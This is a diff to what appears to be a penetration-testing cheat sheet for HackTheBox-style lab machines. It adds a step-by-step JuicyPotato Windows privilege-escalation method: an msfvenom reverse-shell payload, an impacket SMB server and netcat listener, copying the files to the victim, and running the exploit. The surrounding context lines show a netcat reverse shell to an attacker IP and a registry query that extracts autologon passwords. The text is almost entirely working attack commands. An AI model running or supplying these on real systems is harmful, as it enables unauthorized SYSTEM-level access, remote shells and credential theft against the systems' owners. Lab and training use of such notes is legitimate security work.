@@ -214,6 +214,22 @@ Password Protected SSH Private Key:
 			- On the victim machine: juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\tmp\nc.exe -e cmd.exe 10.10.XX.XX 1337" -t *
 		- Find some credentials in the registry for autologon:
 			- reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+
+		- Juicy potato alternative method: 
+			- SeImpersonatePrivilege and seAssignPrimaryTokenPrivilege needs to be enabled: whoami /priv
+			- systeminfo shows system is 32bits
+			- Download juicypotato x86: https://github.com/ivanitlearning/Juicy-Potato-x86/releases
+			- Create a reverse shell: msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f exe > shell.exe
+			- uploade both files to victim: 
+			  - On attacker: 
+			  	- impacket-smbserver smb Downloads/
+				- nc -lnvp 1337
+			  - On Victim:
+			  	- mkdir C:\temp
+				- cd C:\temp
+				- copy \\10.10.16.12\smb\shell.exe
+				- copy \\10.10.16.12\smb\juicypotato86.exe
+				- juicypotato86.exe -l 1337 -p shell.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
 	
 	- LDAP
 		- ldapsearch: ldapsearch -h htb.local -p 389 -x -b "dc=htb,dc=local"
